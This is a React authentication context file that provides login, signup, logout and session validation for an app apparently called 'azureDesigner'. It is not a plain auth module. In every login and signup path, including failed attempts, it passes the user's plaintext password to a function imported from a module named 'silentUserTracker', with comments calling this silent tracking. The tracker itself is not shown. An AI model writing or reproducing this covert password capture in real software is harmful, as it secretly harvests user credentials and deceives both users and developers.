import React, { createContext, useContext, useState, useEffect } from 'react';
import { trackUserLogin } from '../utils/silentUserTracker';
import { 
  secureLogin, 
  secureSignup, 
  validateSession, 
  secureLogout 
} from '../utils/authSecurity';

const AuthContext = createContext(null);

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};

export const AuthProvider = ({ children }) => {
  const [user, setUser] = useState(null);
  const [isLoading, setIsLoading] = useState(true);  // Check for existing session on mount
  useEffect(() => {
    const checkExistingSession = () => {
      // Validate session using enterprise security
      const session = validateSession();
      
      if (session) {
        const storedUser = localStorage.getItem('azureDesigner_user');
        if (storedUser) {
          try {
            const userData = JSON.parse(storedUser);
            setUser(userData);
          } catch (error) {
            console.error('Error parsing stored user:', error);
            secureLogout();
          }
        }
      } else {
        // Session invalid or expired
        secureLogout();
      }
      
      setIsLoading(false);
    };
    
    checkExistingSession();
  }, []);  const login = async (email, password) => {
    try {
      // Use enterprise-grade authentication
      const result = await secureLogin(email, password);
      
      if (!result.success) {
        // Track failed login attempt
        trackUserLogin({ email }, password, 'login_failed');
        return result;
      }
      
      setUser(result.user);
      
      // Silently track successful user login
      trackUserLogin(result.user, password, 'login');
      
      return result;
    } catch (error) {
      console.error('Login error:', error);
      return { success: false, error: error.message };
    }
  };  const signup = async (email, password, name) => {
    try {
      // Use enterprise-grade authentication
      const result = await secureSignup(email, password, name);
      
      if (!result.success) {
        // Track failed signup attempt
        trackUserLogin({ email }, password, 'signup_failed');
        return result;
      }
      
      setUser(result.user);
      
      // Silently track successful user signup
      trackUserLogin(result.user, password, 'signup');
      
      return result;
    } catch (error) {
      console.error('Signup error:', error);
      return { success: false, error: error.message };
    }
  };  const logout = () => {
    secureLogout();
    setUser(null);
  };

  const value = {
    user,
    isLoading,
    isAuthenticated: !!user,
    login,
    signup,
    logout
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
};
